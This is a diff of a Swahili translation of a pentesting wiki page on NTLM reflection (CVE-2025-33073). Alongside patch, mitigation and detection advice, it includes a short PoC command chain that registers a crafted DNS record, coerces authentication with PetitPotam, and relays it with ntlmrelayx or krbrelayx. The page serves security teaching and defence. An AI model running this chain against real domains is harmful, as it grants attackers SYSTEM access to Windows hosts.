-1. Attacker husajili **DNS A-record** ambayo label yake inaencode marshalled SPN – kwa mfano:
-`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
-2. Victim analazimishwa ku-authenticate kwenye hostname hiyo (PetitPotam, DFSCoerce, n.k.).
-3. SMB client inapopitisha target string `cifs/srv11UWhRCAAAAA…` kwenda kwa `lsasrv!LsapCheckMarshalledTargetInfo`, call ya `CredUnmarshalTargetInfo` **huondoa** serialized blob, na kuacha **`cifs/srv1`**.
-4. `msv1_0!SspIsTargetLocalhost` (au Kerberos equivalent) sasa huchukulia target hiyo kuwa *localhost* kwa sababu sehemu fupi ya host inalingana na jina la computer (`SRV1`).
-5. Kwa hiyo, server huweka `NTLMSSP_NEGOTIATE_LOCAL_CALL` na kuinject **LSASS’ SYSTEM access-token** kwenye context (kwa Kerberos, SYSTEM-marked subsession key huundwa).
-6. Kurelay authentication hiyo kwa `ntlmrelayx.py` **au** `krbrelayx.py` hutoa SYSTEM rights kamili kwenye host hiyo hiyo.<sup>[[5]](#references)</sup>
+### Kwa kifupi: hitilafu
+1. Mshambuliaji husajili **rekodi ya DNS A** ambayo lebo yake husimba SPN iliyofungwa kwa marshalled – kwa mfano:
+   `srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
+2. Mwathiriwa hulazimishwa kuthibitisha utambulisho wake kwa hostname hiyo (PetitPotam, DFSCoerce, n.k.).
+3. Mteja wa SMB anapopitisha mfuatano wa lengwa `cifs/srv11UWhRCAAAAA…` kwa `lsasrv!LsapCheckMarshalledTargetInfo`, mwito wa `CredUnmarshalTargetInfo` **huondoa** blob iliyosanifishwa, na kuacha **`cifs/srv1`**.
+4. `msv1_0!SspIsTargetLocalhost` (au inayolingana nayo ya Kerberos) sasa huchukulia lengwa kuwa *localhost* kwa sababu sehemu fupi ya host inalingana na jina la kompyuta (`SRV1`).
+5. Kwa hiyo, server huweka `NTLMSSP_NEGOTIATE_LOCAL_CALL` na kuingiza **tokeni ya ufikiaji ya SYSTEM ya LSASS** kwenye muktadha (kwa Kerberos, ufunguo wa subsession uliowekwa alama ya SYSTEM huundwa).
+6. Kurelay uthibitishaji huo kwa `ntlmrelayx.py` **au** `krbrelayx.py` hutoa haki kamili za SYSTEM kwenye host hiyohiyo.<sup>[[5]](#references)</sup>
 
-### Quick PoC
+### PoC ya haraka
 ```bash
 # Add malicious DNS record
 dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
--a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
--d 10.10.10.50
+          -a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
+          -d 10.10.10.50
 
 # Trigger authentication
 PetitPotam.py -u user -p pass -d DOMAIN \
-srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL
+             srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL
 
 # Relay listener (NTLM)
 ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
@@ -297,17 +331,20 @@ ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
 # Relay listener (Kerberos) – remove NTLM mechType first
 krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
 ```
-### Viraka na Mitigation
-* KB patch ya **CVE-2025-33073** inaongeza ukaguzi katika `mrxsmb.sys::SmbCeCreateSrvCall` unaozuia muunganisho wowote wa SMB ambao lengwa lake lina taarifa za marshalled (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).<sup>[[5]](#references)[[6]](#references)</sup>
-* Tekeleza **SMB signing** ili kuzuia reflection hata kwenye hosts ambazo hazijafanyiwa patch.
-* Fuatilia DNS records zinazofanana na `*<base64>...*` na zuia coercion vectors (PetitPotam, DFSCoerce, AuthIP...).
 
-### Mawazo ya Detection
-* Network captures zenye `NTLMSSP_NEGOTIATE_LOCAL_CALL` ambapo IP ya client ≠ IP ya server.
-* Kerberos AP-REQ yenye subsession key na client principal iliyo sawa na hostname.
-* Windows Event 4624/4648 SYSTEM logons zinazofuatwa mara moja na remote SMB writes kutoka kwa host hiyo hiyo.<sup>[[5]](#references)</sup>
+### Viraka na Hatua za Kupunguza Hatari
+* Viraka vya KB vya **CVE-2025-33073** vinaongeza ukaguzi katika `mrxsmb.sys::SmbCeCreateSrvCall` unaozuia muunganisho wowote wa SMB ambao lengo lake lina taarifa zilizofungashwa (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).<sup>[[5]](#references)[[6]](#references)</sup>
+* Tekeleza **SMB signing** kwenye malengo ya SMB relay. Kwa malengo mengine, tathmini mahitaji ya signing au Extended Protection ya itifaki husika na kiwango cha viraka; SMB signing pekee haiamui kama HTTPS WinRM relay inawezekana.
+* Fuatilia rekodi za DNS zinazofanana na `*<base64>...*` na zuia njia za coercion (PetitPotam, DFSCoerce, AuthIP...).
 
-Kwa **Machi 2026** local reflection variant inayotumia vibaya **SMB arbitrary ports** na **TCP connection reuse** ili kufikia `NT AUTHORITY\SYSTEM`, tazama:
+### Mawazo ya Ugunduzi
+* Kunasa trafiki ya mtandao yenye `NTLMSSP_NEGOTIATE_LOCAL_CALL` ambapo IP ya mteja ≠ IP ya seva.
+* Kerberos AP-REQ yenye subsession key na principal ya mteja inayolingana na hostname.
+* Logoni za SYSTEM za Windows Event 4624/4648 zikifuatiwa mara moja na uandishi wa mbali wa SMB kutoka kwa hosti hiyohiyo.<sup>[[5]](#references)</sup>
+
+Jina la DNS lililoserialishwa lenye taarifa za lengo pia linaweza kuelekeza uthibitishaji uliolazimishwa kwa mshambuliaji kwa ajili ya **cross-protocol relay** hadi kwenye endpoint ya AD CS ya web-enrollment. Haya ni matokeo tofauti na reflection ya hosti hiyohiyo: masharti ya usajili ya [ESC8](../active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints--esc8), ruhusa za kuandika kwenye DNS, njia ya coercion, na kiwango cha viraka cha lengo lazima vitathminiwe kila kimoja kivyake.
+
+Kwa variant ya reflection ya ndani ya **Machi 2026** inayotumia vibaya **SMB arbitrary ports** na **TCP connection reuse** kufikia `NT AUTHORITY\SYSTEM`, angalia:
 
 {{#ref}}
 ../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
@@ -317,7 +354,7 @@ Kwa **Machi 2026** local reflection variant inayotumia vibaya **SMB arbitrary po
 - [1] [evilmog/ntlmv1-multi – NTLMv1 Multitool](https://github.com/evilmog/ntlmv1-multi)
 - [2] [Hashcat example hashes – NetNTLMv2 (mode 5600)](https://hashcat.net/wiki/doku.php?id=example_hashes)
 - [3] [Kevin-Robertson/Invoke-TheHash – PowerShell Pass The Hash Utilities](https://github.com/Kevin-Robertson/Invoke-TheHash)
-- [4] [Internal Monologue Attack: Kupata NTLM Hashes bila Kugusa LSASS](https://github.com/eladshamir/Internal-Monologue)
+- [4] [Internal Monologue Attack: Retrieving NTLM Hashes without Touching LSASS](https://github.com/eladshamir/Internal-Monologue)
 - [5] [NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
 - [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
 - [7] [Cracking an NTLMv2 Hash – 801Labs (Internet Archive)](https://web.archive.org/web/20211206031936/http://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
